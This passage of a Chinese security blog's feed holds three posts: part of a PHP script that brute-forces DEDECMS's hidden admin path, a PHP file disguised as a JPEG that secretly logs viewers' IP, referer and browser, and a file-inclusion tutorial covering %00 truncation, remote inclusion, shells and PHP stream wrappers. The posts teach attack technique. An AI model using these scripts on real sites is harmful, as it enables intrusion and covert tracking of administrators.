class="hljs-literal">true</span>;<span class="hljs-variable">$nn</span>=<span class="hljs-literal">true</span>;<span class="hljs-variable">$path</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">while</span>(<span class="hljs-variable">$n</span>)&#123;    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dic</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$v</span>)&#123;        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dic</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$vv</span>)&#123;            <span class="hljs-comment">#echo $v.$vv .&#x27;----&#x27;;</span>            <span class="hljs-variable">$post_data</span>=<span class="hljs-string">&quot;dopost=save&amp;_FILES[b4dboy][tmp_name]=./<span class="hljs-subst">$v</span><span class="hljs-subst">$vv</span>&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif&quot;</span>;            <span class="hljs-variable">$result</span>=post(<span class="hljs-variable">$url</span>,<span class="hljs-variable">$post_data</span>);            <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$result</span>,<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;                <span class="hljs-variable">$path</span>=<span class="hljs-variable">$v</span>.<span class="hljs-variable">$vv</span>;<span class="hljs-variable">$n</span>=<span class="hljs-literal">false</span>;<span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-keyword">while</span>(<span class="hljs-variable">$nn</span>)&#123;    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dic</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$vvv</span>)&#123;        <span class="hljs-variable">$post_data</span>=<span class="hljs-string">&quot;dopost=save&amp;_FILES[b4dboy][tmp_name]=./<span class="hljs-subst">$path</span><span class="hljs-subst">$vvv</span>&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif&quot;</span>;        <span class="hljs-variable">$result</span>=post(<span class="hljs-variable">$url</span>,<span class="hljs-variable">$post_data</span>);        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$result</span>,<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;            <span class="hljs-variable">$path</span>.=<span class="hljs-variable">$vvv</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$path</span> . PHP_EOL;            <span class="hljs-variable">$giturl</span>=<span class="hljs-variable">$domain</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/images/admin_top_logo.gif&#x27;</span>;            <span class="hljs-keyword">if</span>(@file_get_contents(<span class="hljs-variable">$giturl</span>))&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$domain</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>;                <span class="hljs-variable">$nn</span>=<span class="hljs-literal">false</span>;<span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180226_%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98--%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/03.png" alt="解决DEDECMS历史难题--找后台目录"></p><p>转载自：<a href="https://xianzhi.aliyun.com/forum/topic/2064">https://xianzhi.aliyun.com/forum/topic/2064</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;利用限制&quot;&gt;&lt;a href=&quot;#利用限制&quot; class=&quot;headerlink&quot; title=&quot;利用限制&quot;&gt;&lt;/a&gt;利用限制&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;  仅针对windows系统&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;进入正题&quot;&gt;&lt;a href=&quot;#进入正题&quot; class=&quot;headerlink&quot; title=&quot;进入正题&quot;&gt;&lt;/a&gt;进入正题&lt;/h3&gt;&lt;p&gt;首先看核心文件common.inc.php 大概148行左右&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;hljs php&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$_FILES&lt;/span&gt;)
&amp;#123;
    &lt;span class=&quot;hljs-keyword&quot;&gt;require_once&lt;/span&gt;(DEDEINC.&lt;span class=&quot;hljs-string&quot;&gt;&amp;#x27;/uploadsafe.inc.php&amp;#x27;&lt;/span&gt;);
&amp;#125;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="http://www.secice.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://www.secice.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>访问我的图片就获取你ip和访问地址</title>
    <link href="http://www.secice.cn/p/a23ac9c4"/>
    <id>http://www.secice.cn/p/a23ac9c4</id>
    <published>2018-01-31T01:42:41.000Z</published>
    <updated>2020-11-23T09:04:26.743Z</updated>
    
    <content type="html"><![CDATA[<h3 id="新建个名为-htaccess的文件，内容如下"><a href="#新建个名为-htaccess的文件，内容如下" class="headerlink" title="新建个名为.htaccess的文件，内容如下"></a>新建个名为.htaccess的文件，内容如下</h3><p><code>AddHandler application/x-httpd-php .jpg</code></p><h3 id="新建个1-jpg，内容如下"><a href="#新建个1-jpg，内容如下" class="headerlink" title="新建个1.jpg，内容如下"></a>新建个1.jpg，内容如下</h3><a id="more"></a><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;‘&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;“&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;《&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;》&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIP</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED&#x27;</span>);        &#125;        <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ip</span>;    &#125;    <span class="hljs-variable">$ip</span> = getIP();    @<span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>;    <span class="hljs-variable">$ua</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>].<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;    date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);    <span class="hljs-variable">$date_</span> = date(<span class="hljs-string">&quot;Y.m.d,h:i:sa&quot;</span>).<span class="hljs-string">&quot;\r\n&quot;</span>;<span class="hljs-comment">//记录后台地址等信息</span>    <span class="hljs-variable">$hack</span> = <span class="hljs-string">&#x27;date: &#x27;</span>.<span class="hljs-variable">$date_</span>.<span class="hljs-string">&#x27;ip:&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-string">&#x27;referer: &#x27;</span>.<span class="hljs-variable">$referer</span>.<span class="hljs-string">&#x27;ua: &#x27;</span>.<span class="hljs-variable">$ua</span>;    <span class="hljs-variable">$hack</span> = filter_dangerous_words(<span class="hljs-variable">$hack</span>);    <span class="hljs-variable">$op</span> = fopen(<span class="hljs-string">&#x27;hack.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>);    fwrite(<span class="hljs-variable">$op</span>,<span class="hljs-variable">$hack</span>);    fclose(<span class="hljs-variable">$op</span>);<span class="hljs-comment">//伪装成图片</span>    <span class="hljs-variable">$im</span> = imagecreatefromjpeg(<span class="hljs-string">&quot;2.jpg&quot;</span>);<span class="hljs-comment">//注意该目录下，也要有2.jpg这个图片</span>    header(<span class="hljs-string">&#x27;Content-Type: image/jpeg&#x27;</span>);    imagejpeg(<span class="hljs-variable">$im</span>);    imagedestroy(<span class="hljs-variable">$im</span>); <span class="hljs-meta">?&gt;</span></code></pre><h3 id="放个正常图片，名为2-jpg。"><a href="#放个正常图片，名为2-jpg。" class="headerlink" title="放个正常图片，名为2.jpg。"></a>放个正常图片，名为2.jpg。</h3><h3 id="访问http-127-0-0-1-1-jpg"><a href="#访问http-127-0-0-1-1-jpg" class="headerlink" title="访问http://127.0.0.1/1.jpg"></a>访问<a href="http://127.0.0.1/1.jpg">http://127.0.0.1/1.jpg</a></h3><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>在留言板或者申请友链页面填信息，然后提交</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/01.png" alt="访问我的图片就获取你ip和访问地址"></p><p>等管理员在后台审核的时候看到这图片</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/02.png" alt="02"></p><p>此时就会在你该文件的相同目录下生成一个hack.txt</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/03.png" alt="03"></p><p>这样就获取到后台地址了。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;新建个名为-htaccess的文件，内容如下&quot;&gt;&lt;a href=&quot;#新建个名为-htaccess的文件，内容如下&quot; class=&quot;headerlink&quot; title=&quot;新建个名为.htaccess的文件，内容如下&quot;&gt;&lt;/a&gt;新建个名为.htaccess的文件，内容如下&lt;/h3&gt;&lt;p&gt;&lt;code&gt;AddHandler application/x-httpd-php .jpg&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;新建个1-jpg，内容如下&quot;&gt;&lt;a href=&quot;#新建个1-jpg，内容如下&quot; class=&quot;headerlink&quot; title=&quot;新建个1.jpg，内容如下&quot;&gt;&lt;/a&gt;新建个1.jpg，内容如下&lt;/h3&gt;</summary>
    
    
    
    <category term="学习文章" scheme="http://www.secice.cn/categories/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/"/>
    
    
    <category term="学习文章" scheme="http://www.secice.cn/tags/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>谈一谈文件包含漏洞</title>
    <link href="http://www.secice.cn/p/4484eea8"/>
    <id>http://www.secice.cn/p/4484eea8</id>
    <published>2018-01-12T02:29:22.000Z</published>
    <updated>2020-11-23T09:04:26.536Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a>什么是文件包含</h2><hr><blockquote><p>文件包含这个漏洞，简单来说既是程序猿在开发中为了方便，会将在多个页面重复使用的代码单独写到一个文件中，在需要用到的地方直接包含进来，包含后的文件既相当于将被包含的整个文件内容复制到了包含处。因为在开发中是经常用到的，因此成为了攻击者的目标，便衍生了多种文件包含的攻击。</p></blockquote><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><hr><a id="more"></a><p>先来感受一下，当包含值可被直接控制的情况下是怎么样的如以下代码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);</code></pre><p>可看到以上代码，直接包含的 <code>$file</code> 这种情况下呢，就是可控的情况。</p><blockquote><p>先说一下文件包含的一个要点：文件包含可以包含任意文件，即便被包含的文件并不是与当前编程语言相关，甚至为图片，只要被包含的文件，其内容会被包含文件包含，并以包含文件当前语言执行。</p></blockquote><p>首先在当前文件夹内随便创建任意后缀格式的文件，如：<code>file.txt</code> （就算是图片格式那么效果也是如下）文件内容如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    phpinfo();</code></pre><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/01.png" alt="谈一谈文件包含漏洞"></p><p>文件包含漏洞在支持包含<code>web</code>应用内的目录的同时也直冲包含当前服务器内的其它文件，如下：<br>尝试包含<code>C盘</code>里的某个内容。如：<code>C:\WINDOWS\system.ini</code></p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/02.png" alt="谈一谈文件包含漏洞"></p><p>可看到是直接被包含进来的。</p><p>那么上面说的是传入的文件值为全部可控的情况下的方法，那么如果程序猿在开发中固定死了所包含的文件后缀的话，怎么办？代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] . <span class="hljs-string">&#x27;.php&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>;    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);</code></pre><p>这种情况下，我们按照上面的方法尝试一下,为了方便看到直观效果，这里<br>是将<code>$file</code>输出了。</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/03.png" alt="谈一谈文件包含漏洞"></p><p>我们可以看到，如果在程序中固定死了后缀，那么就像上图一样，将会找不到需要包含的文件。可看到最后所包含的文件名为：<code>./include.txt.php</code>。</p><p>因此这就可以使用另一种方法，就是：<code>%00</code>截断。那么<code>%00</code>截断呢，是可以使用在非常多的地方的，这里不多讲。想了解的童鞋可以网上查一查相关资料。</p><p>这里先说一下PHP中使用<code>%00</code>的前提：</p><ol><li>PHP版本 &lt; 5.3 (不包括5.3) ;</li><li>PHP<code>magic_quotes_gpc = off</code>;</li><li>PHP对所接收的参数，如以上代码的<code>$_GET[&#39;file&#39;]</code>未使用<code>addslashes</code>函数</li></ol><p>因为PHP大于等于5.3的版本已经修复了这个问题，如果开启了<code>gpc</code>或者使用了<code>addslashes</code>函数的话则会对其进行转义。<br>首先我们可以试试如果在<code>gpc</code>开启的情况下会出现什么情况（效果与使用函数的为一致）</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/04.png" alt="谈一谈文件包含漏洞"></p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/05.png" alt="谈一谈文件包含漏洞"></p><p>可以看到了。效果是非常的明显。</p><p>接下来看看在5.3的情况是什么样的</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/06.png" alt="谈一谈文件包含漏洞"></p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/07.png" alt="谈一谈文件包含漏洞"></p><p>也可以看到。是没有任何效果的。</p><p>因此我们可以得知只要满足以上三种情况，那么就可以使用<code>%00</code>；<br>首先我们将PHP版本更换为5.2，然后在<code>php.ini</code>将 <code>magic_quotes_gpc = on</code>改为<code>magic_quotes_gpc = off</code>之后重启 <code>Apache</code>，在尝试下使用截断。</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/08.png" alt="谈一谈文件包含漏洞"></p><p>成功使用截断包含。那么文件包含就只有包含的功能吗？那肯定不是的，既然是文件包含，那么我们可以直接包含一句话。先创建一个文件：<code>shell.txt</code>内容为一句话。</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/09.png" alt="谈一谈文件包含漏洞"></p><p>可以看到，拿<code>shell</code>不是什么问题。</p><p>那么这两种包含有什么区别呢？其实是没有区别的，原理都一样，只不过第一种是将后缀一起传入，第二种则在程序内固定死了后缀。但是可以使用<code>%00</code>因为当程序流遇到<code>%00</code>终止符的时候将直接终止。</p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><blockquote><p>本地文件包含与远程文件包含的原理是相同的，不同点就是前者只能包含服务器内存在的文件，后者则可包含远程服务器内的文件。</p></blockquote><p>远程文件包含的注意点：</p><ol><li>需要 <code>php.ini</code> 内的 <code>allow_url_include = on</code> 以及 <code>allow_url_fopen=on</code></li><li>所需包含的远程文件后缀格式不能以目标服务器的语言相同，如（目标服务器解析PHP代码，那么远程文件后缀格式则不能为 <code>PHP</code> ）</li></ol><p>来解释一下第二点：因为如果你的远程文件是<code>php</code>后缀的话，那么如果你远程文件内容为：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    phpinfo();</code></pre><p>那么在目标服务器内拿到的内容则是你的远程服务器执行<code>phpinfo()</code>后的一个内容，并不是这段代码，因此包含得到的信息并不是目标服务器的而是你远程服务器的。如下：<br><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/10.png" alt="谈一谈文件包含漏洞"></p><p>这个是我远程机的信息，为php5.6版本，目标机的是5.2版本。接下来包含一下。<br><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/11.png" alt="谈一谈文件包含漏洞"></p><p>可以看到，包含后得到的结果就是我们远程机的，为什么呢？？<br>因为目标服务器包含的代码并不是：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></code></pre><p>而是远程服务器执行完这段代码的源代码，如下图：</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/12.png" alt="谈一谈文件包含漏洞"></p><p>所以说远程文件包含只有符合了以上两点才能正常包含。<br>先来修改下：</p><ol><li><p>修改配置<br><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/13.png" alt="谈一谈文件包含漏洞"></p></li><li><p>修改文件后缀<br><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/14.png" alt="谈一谈文件包含漏洞"></p></li></ol><p>再来包含一下。<br><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/15.png" alt="谈一谈文件包含漏洞"></p><p>可以看到这次包含后返回的信息就是我们目标机的信息。</p><p>接下来继续尝试拿shell<br><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16.png" alt="谈一谈文件包含漏洞"></p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/17.png" alt="谈一谈文件包含漏洞"></p><p>远程文件包含的利用前提其实就是符合本地文件包含的前提并且符合远程文件包含本身的前提即可利用。</p><h2 id="文件包含之伪协议"><a href="#文件包含之伪协议" class="headerlink" title="文件包含之伪协议"></a>文件包含之伪协议</h2><hr><p>伪协议在文件包含的利用，本文演示以下伪协议：<br><code>data:text/plain</code> 或 <code>data:text/plain;base64</code><br><code>php://input</code><br><code>php://filter</code><br><code>file://</code><br><code>zip://</code></p><p>其它协议可阅读官方文档：<a href="http://php.net/manual/zh/wrappers.php.php" title="直通车">直通车</a></p><p>data:text/plain</p><p>直接在对应URL参数内输出：<code>data:text/plain</code>,需要执行的php代码  如下图：<br><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/18.png" alt="谈一谈文件包含漏洞"></p><p>这个伪协议还有另一种使用方法，那么就是将需要执行的php代码使用base64编码：<code>data:text/plain;base64</code>,需要执行的<code>base64php</code>代码 如下图：<br><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/19.png" alt="谈一谈文件包含漏洞"></p><hr><p> php://input</p><p><code>php://input</code> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/20.png" alt="谈一谈文件包含漏洞"></p><p>可以看到程序内是固定死后缀的，那么在包含 <code>php://input</code> 的时候就会自动拼接上 <code>.php</code> 所以肯定是不能正常使用 <code>php://input</code>的。所以我们也是可以使用 <code>%00</code> 截断的</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/22.png" alt="谈一谈文件包含漏洞"></p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/23.png" alt="谈一谈文件包含漏洞"></p><p>可以看到终止符是非常强大的。</p><hr><p>php://filter</p><p><code>php://filter</code> 该伪协议可以读取php文件代码以base64编码输出，比如说我们想读取一个php文件但是不想让它正常php执行代码后的结果，我们想要这个php文件的代码的时候就可以使用这个伪协议。<br>使用方法：php://filter/read=convert.base64-encode/resource=需要读取的文件代码内容</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/24.png" alt="谈一谈文件包含漏洞"></p><p>解码后可得到内容</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/25.png" alt="谈一谈文件包含漏洞"></p><hr><p>file://</p><p><code>file://</code> 用于访问本地文件系统，且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br>使用方法：file://文件绝对路径</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/26.png" alt="谈一谈文件包含漏洞"></p><hr><p>zip://</p><p><code>zip://</code>可以访问压缩文件中的文件。但是需要绝对路径。<br>使用方法：zip://[压缩包绝对路径]#[压缩文件内的文件名]</p><p>在本地创建一个文件，并且压缩成zip压缩包。</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/27.png" alt="谈一谈文件包含漏洞"></p><p>可以看到我已经填写了绝对路径以及文件名称，但是为什么不能成功包含呢，可以看到它的报错 <code>Warning: include(zip://C:/phpStudy/WWW/include/phpinfo.zip.php) </code> 我们并不是包含这个文件，我们是要包含这个zip里面的文件，为什么<code>#</code>后面的值没了呢，是因为#会忽略后边的参数，所以我们需要使用编码<code>%23</code>的形式，还有一点就是程序里固定死了 php后缀，因为我们压缩的文件是为php后缀的。所以我们就不用带后缀了，如下图：</p><p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/28.png" alt="谈一谈文件包含漏洞"></p><p>转载自：<a href="http://www.bugsafe.cn/archives/167.html" title="http://www.bugsafe.cn/archives/167.html">http://www.bugsafe.cn/archives/167.html</a></p>]]></content>
    
    
